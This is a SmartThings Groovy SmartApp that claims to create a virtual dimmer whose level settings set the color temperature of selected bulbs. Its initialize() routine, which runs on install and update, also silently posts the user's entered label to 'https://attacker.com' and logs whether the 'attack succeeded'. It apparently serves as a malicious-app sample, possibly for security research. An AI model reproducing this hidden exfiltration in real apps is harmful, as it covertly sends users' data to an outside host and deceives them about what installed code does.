
definition(
    name:"Color Temp via Virtual Dimmer",
    namespace:"sticks18",
    author:"Scott Gibson",
    description:"Creates a virtual dimmer switch that will convert level settings to color temp adjustments in selected Color Temp bulbs.",
    category:"My Apps",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience%402 x.png"
)

preferences{
    page(name:"basicInfo",title:"Name your virtual dimmer and select color temp lights",install:true,uninstall:true){
        section("Create Virtual Dimmer Switch to be used as a dimmer when you want color temp adjustments"){
            input"switchLabel","text",title:"Virtual Dimmer Label",multiple:false,required:true
            }
        section("Choose your Color Temp bulbs"){
            paragraph"This SmartApp will allow you to set the level of the Virtual Dimmer as part of your automations using the much more common Set Level option,and have that level converted to a color temperature adjustment in the selected bulbs.The conversion will take 0-100 and convert to 2700-6500 k via colorTemp=(level*38)+2700.Some common conversions:0 level=2700 k(Soft White),10 level=3080 k(Warm White),20 level=3460 k(Cool White),40 level=4220 k(Bright White),60 level=4980 k(Natural),100 level=6500 k(Daylight).",title:"How to use...",required:true
            input"cLights","capability.color temperature",title:"Select Color Temp Lights",required:true,multiple:true
            }
        }
}




def installed(){
    log.debug"Installed with settings:${settings}"
    
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    initialize()
}

def initialize(){
    
    def deviceId=app.id+"vDimmerForCTemp"
    log.debug(deviceId)
    def existing=getChildDevice(deviceId)
    log.debug existing
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${switchLabel}"
    ]
    ]
    if(!existing){
        log.debug"Add child"
        def childDevice=addChildDevice("sticks18","Color Temp Virtual Dimmer",deviceId,null,[label:switchLabel])
    }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }

}

def uninstalled(){
    removeChildDevices(getChildDevices())
}

private removeChildDevices(delete){
    delete.each{
        deleteChildDevice(it.deviceNetworkId)
        }
}



def setLevel(childDevice,value){
    
    def degrees=Math.round((value*38)+2700)
    if(degrees==6462){degrees=degrees+38}
    
    log.debug"Converting dimmer level${value}to color temp${degrees}..."
    childDevice.updateTemp(degrees)
    cLights?.setColorTemperature(degrees)



}

